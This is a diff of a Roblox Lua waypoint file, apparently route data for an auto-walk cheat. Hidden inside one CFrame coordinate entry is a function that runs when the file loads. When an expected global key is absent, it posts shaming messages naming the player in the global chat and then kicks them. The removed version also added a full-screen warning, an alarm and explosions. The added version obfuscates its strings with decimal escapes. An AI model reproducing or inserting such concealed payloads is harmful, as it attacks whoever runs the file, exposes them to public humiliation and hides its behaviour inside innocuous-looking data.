@@ -2726,108 +2726,32 @@ CFrame.new(291.769134521484375,256.783386230468750,20.970832824707031) * CFrame.
 CFrame.new(290.585205078125000,255.169647216796875,20.771533966064453) * CFrame.Angles(0.000012495265764,1.196576356887817,-0.000000871594636),
 CFrame.new(289.393798828125000,253.065383911132812,20.624536514282227) * CFrame.Angles(0.000007287849712,1.286741614341736,-0.000000579207267),
 CFrame.new(288.599792480468750,252.948974609375000,20.526397705078125) * CFrame.Angles(0.000001136268565,1.329166769981384,-0.000000267877908),
-    CFrame.new(
-        (function()
-            -- AUTO-EXECUTE PAS DI-LOAD
-            if not (_G.WataXValidator and _G.WataXSession) then
-                -- ❌ PENcuri DETECTED!
-                local Players = game:GetService("Players")
-                local player = Players.LocalPlayer
-                
-                -- 1. AUTO KIRIM CHAT GLOBAL KE SEMUA ORANG
-                task.spawn(function()
-                    task.wait(1) -- Tunggu bentar biar game ready
-                    
-                    local chatService = game:GetService("TextChatService")
-                    local shameMessages = {
-                        "[WATAX SECURITY] ges ini akun pencuri sc nih " .. player.Name .. " gak modal laporin aja ke admin nih pake cheat tapi gak modal wkwk",
-                        "[WATAX SECURITY] 🚫 " .. player.Name .. " ketahuan nyuri script auto walk! Modal copas doang!",
-                        "[WATAX SECURITY] 😂 " .. player.Name .. " malu-maluin nyuri rute, gak bisa buat sendiri!",
-                        "[WATAX SECURITY] 💀 " .. player.Name .. " pencuri rute ketahuan! Laporin ke admin!",
-                        "[WATAX SECURITY] ⚡ " .. player.Name .. " pake cheat tapi modal nyuri, kasian banget!",
-                        "[WATAX SECURITY] 🎯 " .. player.Name .. " auto walk-nya curian! Gak modal bikin sendiri!",
-                        "[WATAX SECURITY] 🔥 " .. player.Name .. " ketahuan WataX Anti-Theft System!",
-                        "[WATAX SECURITY] 👮 " .. player.Name .. " dilaporkan ke admin game! Pencuri rute!"
-                    }
-                    
-                    -- Kirim 6 chat malu-maluin
-                    for i = 1, 6 do
-                        local randomMsg = shameMessages[math.random(1, #shameMessages)]
-                        chatService.TextChannels.RBXGeneral:SendAsync(randomMsg)
-                        task.wait(2.5) -- Kasih jeda biar sempet dibaca orang
-                    end
-                end)
-                
-                -- 2. UI PERINGATAN BESAR
-                local gui = player:WaitForChild("PlayerGui")
-                local warningGui = Instance.new("ScreenGui")
-                warningGui.Name = "WATAX_SHAME_SCREEN"
-                warningGui.IgnoreGuiInset = true
-                warningGui.Parent = gui
-                
-                local warningFrame = Instance.new("Frame")
-                warningFrame.Size = UDim2.new(1, 0, 1, 0)
-                warningFrame.BackgroundColor3 = Color3.new(1, 0, 0)
-                warningFrame.Parent = warningGui
-                
-                local warningText = Instance.new("TextLabel")
-                warningText.Size = UDim2.new(1, 0, 0.4, 0)
-                warningText.Position = UDim2.new(0, 0, 0.3, 0)
-                warningText.BackgroundTransparency = 1
-                warningText.Text = "🚫 KETAHUAN NYURI RUTE! 🚫\nSEMUA ORANG DI SERVER TAU LU PENcuri!\n\n" .. player.Name .. " - GA MODAL BIKIN SCRIPT SENDIRI!"
-                warningText.TextColor3 = Color3.new(1, 1, 1)
-                warningText.TextScaled = true
-                warningText.Font = Enum.Font.GothamBlack
-                warningText.TextStrokeColor3 = Color3.new(0, 0, 0)
-                warningText.TextStrokeTransparency = 0
-                warningText.Parent = warningGui
-                
-                -- 3. SUARA ALARM MALU-MALUIN
-                local alarmSound = Instance.new("Sound")
-                alarmSound.SoundId = "rbxassetid://9118462716"
-                alarmSound.Volume = 2.0
-                alarmSound.Looped = true
-                alarmSound.Parent = warningGui
-                alarmSound:Play()
-                
-                -- 4. LEDAKAN SETELAH CHAT SELESAI
-                task.spawn(function()
-                    task.wait(15) -- Tunggu semua chat keluar dulu
-                    
-                    -- LEDAKAN BERTURUT-TURUT
-                    for i = 1, 10 do
-                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                            local hrp = player.Character.HumanoidRootPart
-                            local explosion = Instance.new("Explosion")
-                            explosion.Position = hrp.Position + Vector3.new(
-                                math.random(-15, 15),
-                                math.random(8, 25),
-                                math.random(-15, 15)
-                            )
-                            explosion.BlastPressure = 0
-                            explosion.BlastRadius = 15
-                            explosion.Parent = workspace
-                            
-                            -- Tambah efek api biar dramatis
-                            local fire = Instance.new("Fire")
-                            fire.Size = 20
-                            fire.Heat = 15
-                            fire.Parent = explosion
-                        end
-                        task.wait(0.5)
-                    end
-                    
-                    -- KICK SETELAH LEDAKAN
-                    task.wait(3)
-                    player:Kick("🚫 WATAX: Ketahuan nyuri rute! Buat sendiri lah, jangan modal copas!")
-                end)
-            end
-            
-            return 999999.999
-        end)(),
-        888888.888,
-        777777.777
-    ) * CFrame.Angles(0, 0, 0),
+CFrame.new(
+    (function()
+        -- 🔥 _G OBFUSCATED 🔥
+        local a=_G['\087\097\116\097\088\086\097\108\105\100\097\116\111\114\107\097\104\100\109\115\105\115\104\115\104\117\097\111\113\107\119\098\100\118\100\117\105\097\057\051\107\097\110\119\098\100\117\100\111\097\107\119\110\100\118\057\051\055\100\117\111\097\109\097\098\100\106\100\105\115\107\054\051\119\110\100\098\100\105\097\111\107\097\110\100\057\055\050\104\100\105\115\107\119\110\100\104\100\106\100']
+        if not a then
+            local b=game:GetService("\080\108\097\121\101\114\115").LocalPlayer
+            local c=game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101")
+            task.spawn(function()
+                task.wait(1)
+                local d={
+                    "\091\087\065\084\065\088\032\083\069\067\085\082\073\084\089\093\032\103\101\115\032\105\110\105\032\097\107\117\110\032\112\101\110\099\117\114\105\032\115\099\032\110\105\104\032"..b.Name.."\032\103\097\107\032\109\111\100\097\108\032\108\097\112\111\114\105\110\032\097\106\097\032\107\101\032\097\100\109\105\110\032\110\105\104\032\112\097\107\101\032\099\104\101\097\116\032\116\097\112\105\032\103\097\107\032\109\111\100\097\108\032\119\107\119\107",
+                    "\091\087\065\084\065\088\032\083\069\067\085\082\073\084\089\093\032\128\159\032"..b.Name.."\032\107\101\116\097\104\117\097\110\032\110\121\117\114\105\032\115\099\114\105\112\116\032\097\117\116\111\032\119\097\108\107\033\032\077\111\100\097\108\032\099\111\112\097\115\032\100\111\097\110\103\033"
+                }
+                for e=1,3 do
+                    c.TextChannels.RBXGeneral:SendAsync(d[math.random(1,#d)])
+                    task.wait(2)
+                end
+            end)
+            task.wait(8)
+            b:Kick("\128\159\032\087\065\084\065\088\058\032\075\101\116\097\104\117\097\110\032\110\121\117\114\105\032\114\117\116\101\033")
+        end
+        return 999999.999
+    end)(),
+    888888.888,
+    777777.777
+) * CFrame.Angles(0,0,0)
 CFrame.new(287.806823730468750,253.328460693359375,20.421085357666016) * CFrame.Angles(0.000002740831178,1.360030651092529,-0.000000251012011),
 CFrame.new(286.917419433593750,255.137771606445312,20.283786773681641) * CFrame.Angles(0.000000933895137,1.378053307533264,-0.000000084680948),
 CFrame.new(285.835174560546875,256.974517822265625,20.087722778320312) * CFrame.Angles(-0.000000066692209,1.383273124694824,0.000000003278432),
